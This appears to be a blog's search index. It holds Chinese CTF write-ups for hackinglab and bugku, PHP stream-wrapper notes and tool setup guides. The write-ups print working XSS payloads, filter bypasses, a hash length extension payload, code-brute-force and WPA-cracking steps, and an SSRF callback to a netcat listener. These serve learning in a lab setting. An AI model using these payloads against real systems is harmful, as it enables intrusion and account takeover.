<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[hackinglab网络安全实验室writeup]]></title>
    <url>%2F2018%2F07%2F13%2Fhackinglab%2F</url>
    <content type="text"><![CDATA[基础关key在哪里?查看源代码，直接找到flag 再加密一次你就得到key啦~给出的提示是：1加密之后的数据为xrlvf23xfqwsxsqf 看起来像凯撒加密，题目说的是再，估计是在前一题key的基础上加密的前一题的key是jflsjklejflkdsjfklds，移了13位，在线加密选择移位13即可得到key 猜猜这是经过了多少次加密？一看就是base64，一直base64解码即可拿到key 据说MD5加密很安全，真的是么？md5解密 直接得到key 种族歧视打开之后提示only for Foreigner 拿bp抓个包，将Accept-Language:这一栏的内容删掉即可 HAHA浏览器Hint:据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？估计是改user-agent抓包,只要user-agent里出现HAHA即可得到key key究竟在哪里呢？访问后提示：Key就在这里，猜猜这里是哪里呢？(Web找key加强版)抓个包，查看之后发现在响应头里： key又找不到了照常抓包，发现一个key_is_here_now_.php,估计是个302跳转，用bp访问一下，即可得到key 冒充登陆用户访问后提示：您还没有登陆呢！抓包后发现cookie中有一个login=0的参数，改为1即可得到key 比较数字大小题目给了一个输入框，但是限制了长度，同样的，抓包，把v的值网大传，即可得到flag 本地的诱惑题目坏了，但是这题的解题方法就是XFF，在发送包中添加1X-Forwarded-For:127.0.0.1 即可得到key 就不让你访问题目提示：小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs! 直接扫估计是不行的，试试robots，还真有内容是12345User-agent: *Disallow: /Crawl-delay: 120Disallow: /9fb97531fe95594603aff7e794ab2f5f/Sitemap: http://www.hackinglab.sinaapp.com/sitemap.xml 访问/9fb97531fe95594603aff7e794ab2f5f/,提示1you find me,but I am not the login page. keep search. 提示在login page，直接访问login.php，得到key 脚本关key又又找不到了也是抓包，但是直接看到key了…不清楚原因 快速口算请在2秒内口算结果并提交！ 在2s内算出来机会不大，所以需要写脚本了，附上py脚本 123456789import re import requestss = requests.Session() url = &apos;http://1.hacklist.sinaapp.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&apos;r = s.get(url)num = re.findall(re.compile(r&apos;&lt;br/&gt;\s+(.*)=&lt;input&apos;), r.text)[0] #正则匹配，可以先看看源代码r = s.post(url, data=&#123;&apos;v&apos;: eval(num)&#125;) #计算表达式的值，并将结果提交 抓包可看出要用v提交print (r.text) #输出结果 运行后得到key 这个题目是空的这题有点坑，答案就是null小写 怎么就是不弹出key呢？点了几次不行之后，看看源代码： 可以看到各种return false，但是既然是js的代码，我们就可以在本地搭建将代码复制到本地，然后把前面三个return false的函数干掉 然后本地访问就行了 注意是从chars之后开始的14位 逗比验证码第一期这题的验证码验证一次之后不过期，所以。。抓包爆破即可 爆破之后，密码是1238，拿到key 逗比验证码第二期题目给提示，验证就失效，但是实际上验证一次之后验证码就不需要了，令值为空即可开始爆破。 爆破后得到密码1228，拿到key 逗比的验证码第三期（SESSION）这题做法与上题一样，密码是1298，拿到key 微笑一下就能过关了源代码处点击可以看到源代码 12345678910111213141516171819202122232425262728&lt;?php header(&quot;Content-type: text/html; charset=utf-8&quot;); if (isset($_GET[&apos;view-source&apos;])) &#123; show_source(__FILE__); exit(); &#125; include(&apos;flag.php&apos;); $smile = 1; if (!isset ($_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/\./&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/%/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/[0-9]/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/http/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0; if (preg_match (&apos;/https/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0; if (preg_match (&apos;/ftp/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/telnet/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/_/&apos;, $_SERVER[&apos;QUERY_STRING&apos;])) $smile = 0; if ($smile) &#123; if (@file_exists ($_GET[&apos;^_^&apos;])) $smile = 0; &#125; if ($smile) &#123; $smile = @file_get_contents ($_GET[&apos;^_^&apos;]); if ($smile === &quot;(●&apos;◡&apos;●)&quot;) die($flag); &#125; ?&gt; 这题比较复杂， 首先get提交的参数中不能有特殊字符，数字而且http、https、ftp等协议不能用，$_SERVER[&#39;QUERY_STRING&#39;]中不能出现_字符，但是提交的变量却是^_^并且不能是文件,但是却有个file_get_contents函数， 绕过$_SERVER[&#39;QUERY_STRING&#39;]很简单，因为QUERY_STRING会把.、[等符号解析成_，所以将提交的参数改为^.^、^[^等即可，而绕过file_exists，就是用php的data伪协议，详情请点击php伪协议学习 payload:1^[^=data://text/plain;charset=unicode,(●&apos;◡&apos;●) 逗比的手机验证码这题不清楚为什么要出，没什么技术含量，直接用13388886666手机号获取验证码，然后用13388886667submit就可以得到key 基情燃烧的岁月这题点击获取手机验证码之后提示1手机验证码是：验证码发到手机上了，你看不到..是3位纯数字，开头不为0 看不到，估计是爆破了，但是在爆破之前需要点击一下获取验证码，不然会一直提示错误，然后第一次爆破的结果是： 又得到一个手机号13399999999，同样的方法再爆破一次就能拿到key 验证码识别这题前面的方法都不能用，只能老老实实的识别验证码了，因为全是数字，所以比较好识别，这里用的工具是Pkav HTTP Fuzzer使用方法：将抓到的数据包内容复制粘贴进请求包处 下方的使用与bp差不多，手机验证码变量添加标记即可，验证码变量添加验证码即可，然后将验证码图片的地址复制下来，工具底部有图片型验证码，将地址复制进去，在头部请求加上自己的cookie,在下方点击识别测试： 回到变体设置，设置自己payload，在重放设置栏选择数字自增长模式， 在重放选项处将线程设置为单线程，因为速度过快可能会报错然后底下选择发包器,点击启动即可，一段时间后得到flag XSS基础关XSS的题目在Google浏览器里做不了，所以只能在其他浏览器下做了，这里用的是火狐浏览器XSS可以先看看js的代码，在http://lab1.xseclab.com/xssjs/xss_check.php处可以看到给出key的代码，先试试1&lt;script&gt;alert(HackingLab)&lt;/script&gt; 直接就success，得到了key XSS基础2:简单绕过这题用上题的payload的话会报错，多试几次发现是过滤了&lt;script&gt;，用&lt;img&gt;就能绕过payload:1&lt;img src=haha onerror=alert(HackingLab)&gt; XSS基础3:检测与构造这题输入的值会在下方的input框展示出来，同样过滤了&lt;script&gt;、javascript、&lt;img src&gt; ，但是当查看源代码的时候可以发现，&#39;没有过滤，所以可以用一下闭合的思想，用bp抓包试验一下 输入alert(HackingLab)发现没有过滤alert，但是输入onmouseover=alert(HackingLab)，发现被检测到了，最终发现一个问题，当输入alert时，后面的添加的事件不会被过滤构造payload:1alert&apos;onmouseover=alert(HackingLab)&gt; 然后把鼠标移到第二个输入框即可弹窗，得到key: Principle很重要的XSS这题跟上题类似，但是只是input框变成了href,我用上题的payload直接就得到key了。不清楚为什么给了这么多hint 这些XSS的题目都可以用bp抓响应包来做，应该是后端没有做防护，这里就用最后一个题目做示范首先抓到请求包，右键选择 点击Forward，此时可以看到响应包也就是response包，在下方输入1&lt;img src=haha onerror=alert(HackingLab)&gt; 再点击Forward，因为数据包有点多，所以一直点击Forward直到弹窗就行，弹窗之后还需要点击Forward得到后台给的key，同样能得到key 注入关注入关暂时做不了，题目服务器有问题 上传关请上传一张jpg格式的图片1这题试了几次之后发现是前端验证,上传一个jpg，然后用bp抓包改一下即可拿到key 请上传一张jpg格式的图片2跟第一题一样的做法。 请上传一张jpg格式的图片3这题后端也做了验证，可以先用前面题目的方法试试，发现提交成功但是没有返回key 试了试加一个.jpg 后端代码可能是验证文件名有没有.jpg，拿到key 解密关以管理员身份登录系统打开题目发现这是一个标准的登录框，有忘记密码功能，并且题目提示重置管理员密码就能得到key，先了解一下重置密码功能，在这个输入框中输入的值会被传到后端进行重置，然后给出重置密码链接，但是admin用户重置之后没有提示, 所以我们照常在每个页面都抓包试一试，在这个页面可以看到重置密码链接提交的值中有两个参数，一个是sukey，一个是username 将username改为admin，发现什么都没有显示: 现在只能看另一个参数sukey了，长度看起来像md5，md5解密试试： 解出来是一个时间戳，转为北京时间是2018/7/19 14:5:54 就是我刚刚提交的时间，所以思路大概就是将上传的时间转为Unix时间戳，然后md5加密，将sukey和username分别等于md5加密后的时间戳和admin提交，并且响应包得到的时间是比实际时间少的， 这里给出两种做法 第一种是手动将响应包里的时间手动转为Unix时间戳 第二种是用脚本获取响应包的时间 第一种： 先提交username为admin，然后记录下响应头的date 然后去在线网站转为时间戳,记住小时需要跟北京时间一样，其他都一样 将sukey等于时间戳md5加密后的值访问即可， 得到key 第二种是用python，但是time()函数得到的当前时间戳与上传时的对不上，所以只能与手动的方法一样，从响应头里获取时间。附上脚本:1234567891011121314151617import requests,hashlib,time,redef month(month): months = [&quot;Jua&quot;,&quot;Feb&quot;,&quot;Mar&quot;,&quot;Apr&quot;,&quot;May&quot;,&quot;Jun&quot;,&quot;Jul&quot;,&quot;Aug&quot;,&quot;Sep&quot;,&quot;Oct&quot;,&quot;Nov&quot;,&quot;Dec&quot;] for a in range(0,len(months)): if months[a] == month: return a+1r = requests.session()url = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/resetpassword.php&apos;post = &#123;&apos;username&apos;:&apos;admin&apos;&#125;a = r.post(url,data = post)list = re.compile(r&apos;[\,\s\:]+&apos;).split(a.headers[&apos;date&apos;])ct = (list[3]+&apos;-&apos;+str(month(list[2]))+&apos;-&apos;+list[1]+&apos; &apos;+str(int(list[4])+8)+&apos;:&apos;+list[5]+&apos;:&apos;+list[6])sukey = hashlib.new(&apos;md5&apos;,str(int(time.mktime(time.strptime(ct,&apos;%Y-%m-%d %H:%M:%S&apos;)))).encode(encoding=&apos;utf-8&apos;)).hexdigest()url2 = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=&apos;+sukey+&apos;&amp;username=admin&apos;print(r.get(url2).text) 邂逅对门的妹纸这题给的是一个wifi的握手包，kali中有专门的工具来破解握手包aircrack，但是需要字典，给了年级和年份，估计密码就是生日了，先从网上下载一个生日字典，也可以自己生成使用方法1aircrack-ng wifi-crack.cap -w pass.txt 得到生日密码之后按照题目要求加密提交即可 万恶的Cisco直接GoogleCisco破解,Cisco思科密码在线解密 万恶的加密huawei交换机的加密方式，有人写过python工具使用方法1python27 hh3c_cipher.py -c &quot;aK9Q4I)J&apos;#[Q=^Q`MAF4&lt;1!!&quot; 喜欢泡网吧的小明给的是一个dump文件，里头的内容有些看不懂，看了网上的wp才知道做的，1首先将当下的数据不做改动，进行刷卡，显示卡片异常。说明，卡片的头信息错误。一般的卡片的头信息应该是前8~16个字节。头信息应该有个开始和结束标准信息。 直接将文件上传的话会显示卡片异常，并且题目提示了有一个字节产生了错误。 网上给的wp是将开头的AA变为8A, 原因是头部信息错误所以读取失败，具体为什么改为8A也不清楚，但是改为8A后，提示: 可以正常刷卡了，但是余额为100，往下看文件内容，有1027，转为10进制是4135，没有啥关系，但是这些卡的加密方式是有可能倒叙的，所以再试试2710，可以发现刚好是10000，对应的是100.00，所以我们现在只需要将20000转为16进制，然后倒序即可,将两个1027的值改为204E，保存再上传即可 异常数据题目给出一段加密后的字符1AGV5IULSB3ZLVSE= 数字和字母，估计是base32，但是base32解不出，所以大概率是base64，只是把其中的小写字母换成了大写，base64是3位为一组，加密成4个字节，所以分成1234AGV5IULSB3ZLVSE= 首先看看第一次解密: 出了乱码，所以将A改为小写 可以发现思路就是这样，hey已经出来了，所以可以进行下一组，重复这个步骤即可 最终为 1234aGV5IUlsb3ZlVSE= 解码链接 md5真的能碰撞嘛?题目点击__后，可以直接看到源码，1234567891011121314&lt;?php$flag=FLAG;if(isset($_POST[&quot;password&quot;]))&#123; $password=$_POST[&apos;password&apos;]; $rootadmin=&quot;!1793422703!&quot;; if($password==$rootadmin)&#123;die(&quot;Please do not attack admin account!&quot;);&#125; if(md5($password)==md5($rootadmin))&#123; echo $flag; &#125;else&#123; die(&quot;Password Error!&quot;); &#125;&#125;?&gt; 大概意思就是$rootadmin的md5要跟上传上去的值的md5一样，而且本身的值也不能一样先看看!1793422703!的md5是多少,10e332932043729729062996282883873 0e后面全是数字，php弱类型，POST1password=240610708或者QNKCDZO 拿到key 小明爱上了一个搞硬件的小姑凉题目给的是一个logicdata文件，提示是一个逻辑分析仪抓包数据，winhex打开之后，在文件的最后有一串英文， 搜一搜saleae,发现需要下载这个公司的软件才能解密下载链接下载完用这个号软件打开之后即可看到答案，英文不好的同学注意，COMMA是逗号的意思 有签名限制的读取任意文件右键查看源代码可以看到部分代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);include &quot;_flag.php&quot;;include &quot;salt.php&quot;;$mysalt=SALT;if(isset($_GET[&apos;filepath&apos;])&amp;&amp;!empty($_GET[&apos;filepath&apos;]) &amp;&amp;isset($_GET[&apos;sign&apos;]) &amp;&amp;!empty($_GET[&apos;sign&apos;]))&#123; myreadfile($_GET[&apos;filepath&apos;],$mysalt,$_GET[&apos;sign&apos;]); &#125;else&#123; //降低一点复杂度 var_dump(strlen($mysalt)); testsign(&quot;/etc/hosts&quot;,$mysalt);&#125;function myhash($message,$mysalt)&#123; return md5($mysalt.$message);&#125;function checksign($message,$mysalt,$sign)&#123; if($sign==myhash($message,$mysalt))&#123; return True; &#125;else&#123; return False; &#125;&#125;function myreadfile($filepath,$mysalt,$sign)&#123; $res=checksign($filepath,$mysalt,$sign); if($res)&#123; echo getfile($filepath); &#125; else&#123; echo &apos;sign error!&apos;; &#125;&#125;function testsign($filepath,$mysalt)&#123; echo myhash($filepath,$mysalt);&#125;echo &quot;&lt;!--&quot;.file_get_contents(__FILE__); 题目已经给出提示MD5 Length Extension Attack!，md5长度扩展攻击，先看看代码，可以知道的是已知md5，已知salt的长度，还知道/etc/hosts,这里给出工具下载链接使用方法：1234567891011$ hashpump -hHashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength] HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack. -h --help Display this message. -t --test Run tests to verify each algorithm is operating properly. -s --signature The signature from known message. -d --data The data from the known message. -a --additional The information you would like to add to the known message. -k --keylength The length in bytes of the key being used to sign the original message with. Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support. &lt;Developed by bwall(@botnet_hunter)&gt; 安装方法1234git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmake install 这里我们知道的是signature、data、keylength,需要读取的文件这里写成_flag.php所以工具使用： 1hashpump -s f3d366138601b5afefbd4fc15731692e -d /etc/hosts -k 32 -a /etc/_flag.php 提交时需要把\x换成%，因为是URL编码的最终的payload是：1http://lab1.xseclab.com/decrypt1_53a52adb49c55c8daa5c8ee0ff59befe/md5_le.php?filepath=/etc/hosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00/etc/_flag.php&amp;sign=7fbbac6efeb7939be04829bc9a847f0c 美丽的邂逅与密码器的开门密码这题题目给的一个exe文件，名字还是reverse,逆向题，IDA打开之后找到主函数 可以看到当v19等于1的时候才会输出一段字符，找到401005函数，1234int __cdecl sub_401005(char *a1)&#123; return sub_401020(a1);&#125; 又跳到了401020,12345678910BOOL __cdecl sub_401020(char *a1)&#123; char v2; // [sp+Ch] [bp-44h]@1 int v3; // [sp+4Ch] [bp-4h]@1 memset(&amp;v2, 0xCCu, 0x44u); v3 = 0; v3 = strlen(a1); return v3 &gt; 50;&#125; 可以看出来当v20的长度大于50就能返回true，也就是1运行程序，输入任意字符，长度大于50: 得到key 综合关渗透测试第一期这题先把每个页面POST的变量抓个包看看，在尝试了几次之后，发现几个问题 注册时用户名不能使用admin 在绑定手机页面出现了username这个变量 绑不绑定手机效果都一样 在忘记密码页面，需要跟用户名与之绑定的手机号才能得到验证码 这题就有了大概的思路，需要登录进admin账户，但是不知道密码，爆破试了之后发现不少弱口令，所以需要重置密码，重置密码时需要手机号，但是当将username等于admin之后，发现: 所以需要将admin用户的手机号绑定为已知的手机号，刚好在绑定手机页面username可以更改， 回到忘记密码页面，Username填写admin，正常发送即可重置密码 再用重置的密码登陆即可得到key 没有注入到底能不能绕过登录首先题目提示了不是SQL注入，并且题目里没有什么有用的提示，所以只能先扫一下后台，发现robots.txt 12User-agent: *Disallow: /myadminroot/ 访问一下myadminroot，但是提示Please login first!所以现在找办法登陆，但是我用burpsuite抓包时发现，在登陆页面go一次之后，在其他页面访问myadminroot就能得到key所以发现了在弹出error时，不点击确认就不会将已经登陆的状态取消，估计就是session的原因，直接得到key 美图闪亮亮交友平台题目直接给了12Tips: 邮箱没有xss漏洞Tips: 管理员用的是手机wap邮箱,而且管理员的手机不支持Cookie(20150823) 邮箱没有XSS，但是在题目中的input框中还是存在XSS，管理员也没有cookie，所以没办法使用管理员的cookie登陆进后台，在网上找了也没有writeup，最终看到了出题人给的提示1题目采用curl模拟方式来模拟管理员审核的过程。 估计是SSRF先说下解题思路，在姓名和照片描述处都没有做要求，但是在图片URL处对内容做了要求，必须是网址，但是抓包发送的话可以绕过js， 并且在&lt;img&gt;处没有过滤，可以正常弹窗，代码1http://www.hackinglab.cn/meitu.jpg11&quot; onerror=&quot;alert(1) 一开始看起来像存储型XSS但是题目给了提示，并不是XSS所以只能换一种思路，在看了出题人给的提示之后，看到了curl SSRF 漏洞出现的场景： 能够对外发起网络请求的地方，就可能存在 SSRF 漏洞 从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed） 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB） Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP） 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML） 猜测是管理员用curl命令访问了图片URL,这里采用nc来获取信息:服务器端，监听一个端口（确保这个端口是开着的）1nc -l 8888 图片URL:1http://你的服务器IP:8888 再发送即可， 此时在自己的服务器上可以看到一个请求 访问这个URL即可得到key]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php伪协议学习]]></title>
    <url>%2F2018%2F07%2F12%2Fphpagree%2F</url>
    <content type="text"><![CDATA[php支持的协议和封装的协议: 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 CTF中主要出现的是php://,zlib,data,phar,所以文章主要研究的是这四种，其他的只是简单的学习一下。 file://、http://&amp;https、ftp://&amp;ftps://、glob://file://文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码1234&lt;?php include($_REQUEST[&apos;s&apos;]); var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=file:///绝对路径\1.php 此时回显的是hello,world，这里有个小问题，1.php中的echo执行了，但是2.php中却是空的，这是因为已经被解析了，查看源代码即可看到。 http://&amp;https://允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。 HTTP 请求会附带一个 Host: 头，用于兼容基于域名的虚拟主机。 如果在你的 php.ini 文件中或字节流上下文（context）配置了 user_agent 字符串，它也会被包含在请求之中。1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码123&lt;?php var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=http://127.0.0.1/phpagree/1.php 此时回显的是hello,world，并且就是http://127.0.0.1/phpagree/1.php的内容 ftp://&amp;ftps://允许通过 FTP 读取存在的文件，以及创建新文件。 如果服务器不支持被动（passive）模式的 FTP，连接会失败。由于暂时没有搭建ftp的服务器，所以暂时无法演示。 glob://查找匹配的文件路径模式1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码12345678910&lt;?php// 循环 ext/spl/examples/ 目录里所有 *.php 文件// 并打印文件名和文件尺寸$it = new DirectoryIterator($_REQUEST[&apos;s&apos;]);foreach($it as $f) &#123; printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);&#125;?&gt; 结果如下 php://、data://、zlib://、phar://php://PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 首先要确保，在php.ini中allow_url_include设置为On,因为allow_url_include依赖于allow_url_fopen，所以allow_url_fopen也需要开启。 php://input访问请求的原始数据的只读流，可以接收到post的数据，但是当enctype=”multipart/form-data” 的时，php://input无效 1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码1234&lt;?php include($_GET[&apos;s&apos;]); var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=php://input 并且POST1.php此时回显: 可以看到1.php直接被当成了一个字符串，并没有解析。但是当POST&lt;?php echo &#39;hello,world&#39;; ?&gt;时，直接就解析了： 因为php://input相当于直接包含了&lt;?php echo &#39;hello,world&#39;; ?&gt;，并且解析，类似于include。 php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。 2.php代码12345&lt;?php $output = fopen($_REQUEST[&apos;s&apos;],&apos;w&apos;); fwrite($output, &quot;hello,world&quot;); fclose($output);?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=php://output 此时回显: php://filter是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 参数:1234resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码1234&lt;?php include($_REQUEST[&apos;s&apos;]); //var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 此时的回显是: base64解码之后就是1.php的内容了 再来看一下bugku上题的payload1URL?file=php://filter//read=convert.base64-encode/resource=index.php 比如这个payload中read=convert.base64-encode，resource=index.php，过滤器还有很多种，这里给出官方文档CTF中用的最多的还是convert.base64-encode，其他的了解一下就好。还有一个小问题，为什么include的时候没有解析，因为经过base64编码后，不会被直接解析。 data://数据（RFC 2397）用法data://text/plain;base64, 2.php代码1234&lt;?php include($_REQUEST[&apos;s&apos;]); //var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=data://text/plain;base64,PD9waHANCgkkaGVsbG8gPSAnaGVsbG8sd29ybGQnOw0KCWVjaG8gJGhlbGxvOw0KPz4= 即可得到hello,world,因为PD9waHANCgkkaGVsbG8gPSAnaGVsbG8sd29ybGQnOw0KCWVjaG8gJGhlbGxvOw0KPz4=base64解码之后就是1.php的内容，include包含之后就解析成功了。 来看hackinglab一道题的payload:1URL?^.^=data://text/plain;charset=unicode,(●&apos;◡&apos;●) wp不仔细说，用法data:[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt; zlib://&amp;phar://zlib://压缩流用法zip://archive.zip#dir/file.txt phar://PHP 归档用法类似于zlib://，这两种主要是用于getshell，本地不方便做实验，所以就不用演示了。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sublime分别配置python2&3编译环境]]></title>
    <url>%2F2018%2F07%2F09%2Fsublimepy%2F</url>
    <content type="text"><![CDATA[新建sublime-build文件在上方菜单栏打开工具(T)-&gt;编译系统(U)-&gt;新编译系统，此时会出来一个文件： 将以下代码覆盖上去即可123&#123; &quot;cmd&quot;: [&quot;这里写python安装的目录/python.exe&quot;, &quot;-u&quot;, &quot;$file&quot;]&#125; 因为我配置的是python27的环境，所以保存的文件名写上python27.sublime-build，python3也类似，保存即可。此时在编译环境下可以看到python27了(sublime在编译环境中有一个预存的python，它的环境配置是默认在cmd中输入python的编译环境，我这里输入python是python3的环境，所以添加python2的环境) 编译新建一个py文件，输入12print &apos;hello&apos; 测试，ctrl+b快捷编译 编译成功，可以使用了]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>sublime</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下python2&3环境变量及pip2&3冲突设置]]></title>
    <url>%2F2018%2F07%2F09%2Fpython23%2F</url>
    <content type="text"><![CDATA[1.安装Python这一步比较简单，去官网上下载安装就行了，下载链接 2.配置环境变量右键我的电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量在Path栏双击，点击新建，将Python2&amp;3的安装目录分别添加进去，这里均适用默认目录: 此时在cmd输入Python，如果有效的话，证明环境变量已经设置好了。若想输入python2&amp;3分别出现python2和python3的话，将安装目录下的python.exe更改为python2或3即可。 3.解决pip2&amp;3问题若出现unable to create process using &#39;&quot;&#39;，可能是pip版本过低输入1python36 -m pip install -U pip 即可若还是不行，将python3安装目录下的Scripts/pip.exe删除后就能正常使用]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Linux中如何安装Google Chrome并安装插件]]></title>
    <url>%2F2018%2F06%2F24%2Fkali-google%2F</url>
    <content type="text"><![CDATA[因为一些原因，需要在Windows下Centos的VMware虚拟机中kali的KVM虚拟机中安装Google浏览器，做个笔记 安装Google Chrome使用wget命令下载Google Chrome的debian安装包在shell中输入：1wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb 下载完之后我们准备安装,输入1dpkg -i google-chrome-stable_current_amd64.deb 但是此时会出现依赖问题： 输入以下命令后解决 1apt-get -f install 选择 y 解决完依赖问题后即可正常安装，运行 1google-chrome 会提示： 没有–no-sandbox 不支持root用户使用，虽然可以在后面加上–no-sandbox的命令，但是一般我们使用google浏览器是在GUI界面上使的。所以这里再介绍GUI界面如何解决： 首先在/usr/share/applications找到Google-Chrome然后右键图标-&gt;文件属性-&gt;桌面项-&gt;命令 在stable后面加上 1--no-sandbox --user-data-dir&amp; 注意空格,然后点击确认即可。 Kali中Google-Chrome安装插件可以直接在Kali中的Google-Chrome下载插件，但是需要挂梯子，因为我不会在kali里科学上网，所以只能导入安装包了。 首先需要得到安装包，而得到安装包的方法一般有两种： 从网上下载安装包 从Windows上的Google Chrome中导出安装包 这里建议从Windows上导出，因为网上下载的.crx文件部分不能用。 从Windows上的Google Chrome中导出安装包：首先你的电脑肯定需要挂梯子，不会的可以点此学习ssr的搭建然后登录google账户，在应用商店里下载插件。 下载完需要的插件之后点击浏览器右上方的菜单-&gt;更多工具-&gt;扩展程序。 点击打包扩展程序，会让你输入目录，我们先点击取消 点击所需要安装插件的详细信息，可以看到有个ID值： 需要从浏览器安装的插件目录中找到这个ID值,插件安装的位置一般是默认在 1C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Extensions 其中user是你电脑的用户名，找到文件夹之后，打开文件夹，里面有个版本的文件夹，继续打开直到: 此时将文件夹路径复制下来输入到刚刚填写的目录中，再点击打包扩展程序即可。 此时会出来扩展程序和秘钥文件： 我们需要的是.crx文件，将路径记下来，打开xftp连接kali进行文件传输 将文件传进去即可。 然后进入kali的GUI界面打开Google浏览器，打开扩展程序页面： 将刚刚的.crx文件拖进去即可完成安装]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku writeup(杂项、Web）]]></title>
    <url>%2F2018%2F06%2F06%2Fbugku%2F</url>
    <content type="text"><![CDATA[Webweb2滑稽，F12查看源，得到flag： 文件上传测试题目提示：请上传PHP文件，文件上传大小不允许超过1M试了几次之后，当上传php文件时提示非图片文件，上传图片时，提示非php文件，打开burpsuite，将一个php文件的后缀加上.jpg，上传时将.jpg删掉再上传即可 计算器题目给出的输入框限制了最大输入长度，F12将最大长度限制删掉就行. web基础$_GET这题有基础的都知道怎么做：代码：1234$what=$_GET[&apos;what&apos;];echo $what;if($what==&apos;flag&apos;)echo &apos;flag&#123;****&#125;&apos;; 将what提交了就行 web基础$_POST跟上题一样: 矛盾代码：1234567$num=$_GET[&apos;num&apos;];if(!is_numeric($num))&#123;echo $num;if($num==1)echo &apos;flag&#123;**********&#125;&apos;;&#125; 代码意思是当num不是个数字并且值等于1的时候输出flag：payload:URL?num=1x31提交拿到flag web3打开的时候阻止页面创建对话框 查看源码，在最底下有串代码 html码得到flag附上解码连接 sql注入这题是宽字节注入：原理：12345678910GBK 